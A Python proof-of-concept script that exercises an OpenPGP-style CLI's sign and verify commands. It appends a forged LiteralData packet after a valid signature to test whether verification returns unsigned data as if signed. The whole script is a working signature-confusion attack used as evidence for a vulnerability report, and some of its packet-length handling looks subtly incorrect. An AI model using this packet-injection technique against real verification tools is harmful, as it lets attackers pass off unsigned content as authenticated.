#!/usr/bin/env python3
"""
poc.py - Drive an OpenPGP-style CLI binary and report structured evidence
about message-verification operations.

Usage:
    python3 poc.py --binary <path> [--json-out <path>] [--timeout <seconds>]
"""

import argparse
import base64
import json
import os
import struct
import subprocess
import sys
import tempfile
import time


def crc24(data: bytes) -> int:
    """Compute OpenPGP CRC24 over data."""
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def make_armor(raw: bytes, label: str = "PGP MESSAGE") -> str:
    """ASCII-armor raw binary OpenPGP data."""
    checksum = crc24(raw)
    b64 = base64.b64encode(raw).decode("ascii")
    lines = [f"-----BEGIN {label}-----", ""]
    for i in range(0, len(b64), 76):
        lines.append(b64[i : i + 76])
    lines.append(
        "=" + base64.b64encode(checksum.to_bytes(3, "big")).decode("ascii")
    )
    lines.append(f"-----END {label}-----")
    return "\n".join(lines) + "\n"


def parse_packets(raw: bytes) -> list:
    """Parse OpenPGP packets from raw bytes. Returns list of dicts."""
    pos = 0
    packets = []
    while pos < len(raw):
        ctb = raw[pos]
        pos += 1
        tag = ctb & 0x3F
        fl = raw[pos]
        pos += 1
        if fl < 192:
            length = fl
            hdr = 2
        elif fl < 224:
            length = ((fl - 192) << 8) + raw[pos]
            pos += 1
            hdr = 3
        else:
            length = struct.unpack(">I", raw, pos)[0]
            pos += 4
            hdr = 6
        pkt_start = pos - hdr
        full_pkt = raw[pkt_start : pos + length]
        pos += length
        packets.append(
            {"ctb": ctb, "tag": tag, "length": length, "full": full_pkt}
        )
    return packets


def build_new_literal_packet(payload: bytes) -> bytes:
    """
    Build a new-format LiteralData packet (tag 11).
    Format byte = 'b' (binary), empty filename, timestamp = 0.
    """
    body = struct.pack(">B B I", 0x62, 0, 0) + payload
    body_len = len(body)
    # New-format CTB uses bit 7 and bit 6 set: 0xC0 | tag
    if body_len < 192:
        return struct.pack(">BB", 0xC0 | 11, body_len) + body
    else:
        return (
            struct.pack(">B", 0xC0 | 11)
            + struct.pack(">H", body_len + 192)
            + body
        )


def run_binary(
    binary: str, args: list, timeout: int
) -> dict:
    """Run the target binary with the given args and return result info."""
    cmd = [binary] + args
    start = time.time()
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            timeout=timeout,
        )
        timed_out = False
    except subprocess.TimeoutExpired:
        proc = subprocess.CompletedProcess(
            cmd, returncode=-1, stdout=b"", stderr=b""
        )
        timed_out = True
    runtime_ms = int((time.time() - start) * 1000)

    # Extract signal from return code (negative = killed by signal)
    signal = None
    returncode = proc.returncode if not timed_out else -1
    if returncode < 0:
        signal = -returncode
        returncode = -returncode

    return {
        "command": cmd,
        "returncode": returncode if not timed_out else -1,
        "signal": signal,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": proc.stdout.decode("utf-8", errors="replace"),
        "stderr": proc.stderr.decode("utf-8", errors="replace"),
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Drive an OpenPGP CLI binary and report evidence."
    )
    parser.add_argument("--binary", required=True, help="Path to the target binary")
    parser.add_argument(
        "--json-out",
        default=None,
        help="Optional path to write the JSON result to a file",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=120,
        help="Per-invocation timeout in seconds (default 120)",
    )
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    timeout = args.timeout
    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": None,
        "stderr": None,
        "observable": None,
        "error": None,
    }

    tmpdir = tempfile.mkdtemp(prefix="poc_")
    try:
        # ------------------------------------------------------------------
        # 1. Generate a key pair
        # ------------------------------------------------------------------
        keygen = run_binary(
            binary,
            ["keygen", "--out-dir", tmpdir, "--name", "pockey"],
            timeout,
        )
        keygen_data = json.loads(keygen["stdout"])
        if not keygen_data.get("ok"):
            result["error"] = "keygen failed"
            print(json.dumps(result))
            return

        priv_key = keygen_data["private_key_file"]
        pub_key = keygen_data["public_key_file"]

        # ------------------------------------------------------------------
        # 2. Create a baseline data file and sign it
        # ------------------------------------------------------------------
        baseline_data = b"Hello, World!\n"
        data_file = os.path.join(tmpdir, "data.txt")
        with open(data_file, "wb") as f:
            f.write(baseline_data)

        signed_msg = os.path.join(tmpdir, "signed.asc")
        sign_run = run_binary(
            binary,
            ["sign", "--key", priv_key, "--data", data_file, "--out", signed_msg],
            timeout,
        )
        sign_data = json.loads(sign_run["stdout"])
        if not sign_data.get("ok"):
            result["error"] = "sign failed"
            print(json.dumps(result))
            return

        # ------------------------------------------------------------------
        # 3. Verify the baseline signed message
        # ------------------------------------------------------------------
        verify_run = run_binary(
            binary,
            ["verify", "--message", signed_msg, "--key", pub_key],
            timeout,
        )
        verify_data = json.loads(verify_run["stdout"])
        if not verify_data.get("ok"):
            result["error"] = "baseline verify failed"
            print(json.dumps(result))
            return

        baseline_verified = bool(verify_data["verified"])
        baseline_data_b64 = verify_data["data"]["b64"]
        baseline_data_text = verify_data["data"]["text"]

        # ------------------------------------------------------------------
        # 4. Build the crafted message
        #
        # Baseline message structure: OPS + LiteralData(hello) + Signature
        #
        # Crafted message structure:
        #   OPS + LiteralData(hello) + Signature + LiteralData(evil_payload)
        #
        # The signature was computed over the original literal data (hello).
        # The trailing LiteralData packet carries the evil payload.
        # On some builds, verify returns the original data; on others it
        # returns the embedded payload.
        # ------------------------------------------------------------------
        with open(signed_msg) as f:
            lines = f.readlines()

        in_body = False
        b64_data = ""
        for line in lines:
            line = line.strip()
            if line == "-----BEGIN PGP MESSAGE-----":
                in_body = True
                continue
            if line.startswith("-----END PGP MESSAGE-----"):
                in_body = False
                continue
            if in_body and line and not line.startswith("="):
                b64_data += line

        raw = base64.b64decode(b64_data)
        packets = parse_packets(raw)

        # Should be 3 packets: OPS, LiteralData, Signature
        assert len(packets) >= 3, (
            f"Expected at least 3 packets, got {len(packets)}"
        )

        # Evil payload to embed
        evil_payload = b"EVIL DATA"
        evil_literal_pkt = build_new_literal_packet(evil_payload)

        # Craft: OPS + original_literal + Signature + new_literal
        crafted_raw = (
            packets[0]["full"] + packets[1]["full"] + packets[2]["full"] + evil_literal_pkt
        )

        # ASCII-armor the crafted message
        crafted_msg = os.path.join(tmpdir, "crafted.asc")
        with open(crafted_msg, "w") as f:
            f.write(make_armor(crafted_raw))

        # ------------------------------------------------------------------
        # 5. Verify the crafted message
        # ------------------------------------------------------------------
        crafted_verify_run = run_binary(
            binary,
            ["verify", "--message", crafted_msg, "--key", pub_key],
            timeout,
        )
        crafted_verify_data = json.loads(crafted_verify_run["stdout"])
        if not crafted_verify_data.get("ok"):
            result["error"] = "crafted verify failed"
            print(json.dumps(result))
            return

        crafted_verified = bool(crafted_verify_data["verified"])
        crafted_data_b64 = crafted_verify_data["data"]["b64"]
        crafted_data_text = crafted_verify_data["data"]["text"]

        # ------------------------------------------------------------------
        # 6. Build the observable
        # ------------------------------------------------------------------
        observable_value = json.dumps(
            {
                "verified": crafted_verified,
                "data_b64": crafted_data_b64,
                "data_text": crafted_data_text,
                "baseline_verified": baseline_verified,
                "baseline_data_b64": baseline_data_b64,
                "baseline_data_text": baseline_data_text,
                "payload_b64": base64.b64encode(evil_payload).decode("ascii"),
                "payload_text": evil_payload.decode("ascii"),
            }
        )

        result["command"] = crafted_verify_run["command"]
        result["returncode"] = crafted_verify_run["returncode"]
        result["signal"] = crafted_verify_run["signal"]
        result["timed_out"] = crafted_verify_run["timed_out"]
        result["runtime_ms"] = crafted_verify_run["runtime_ms"]
        result["stdout"] = crafted_verify_run["stdout"]
        result["stderr"] = crafted_verify_run["stderr"]
        result["observable"] = {
            "kind": "custom",
            "value": observable_value,
            "path": None,
        }
        result["error"] = None

        # ------------------------------------------------------------------
        # 7. Verify the output contract
        # ------------------------------------------------------------------
        # Sanity: baseline must be verified
        assert baseline_verified, "Baseline message must verify as true"
        assert baseline_data_b64 == base64.b64encode(baseline_data).decode("ascii"), (
            "Baseline data mismatch"
        )

        # Crafted must be verified
        assert crafted_verified, "Crafted message must verify as true"

        # The returned data is build-dependent; we just report what we got
        # (no assertion on which data is returned)

        # ------------------------------------------------------------------
        # 8. Output
        # ------------------------------------------------------------------
        out_str = json.dumps(result)
        print(out_str)

        if args.json_out:
            out_path = os.path.abspath(args.json_out)
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "w") as f:
                f.write(out_str + "\n")

    except Exception as e:
        result["error"] = str(e)[:200]
        print(json.dumps(result))
        if args.json_out:
            with open(os.path.abspath(args.json_out), "w") as f:
                f.write(json.dumps(result) + "\n")
        return 1
    finally:
        import shutil

        shutil.rmtree(tmpdir, ignore_errors=True)

    return 0


if __name__ == "__main__":
    sys.exit(main())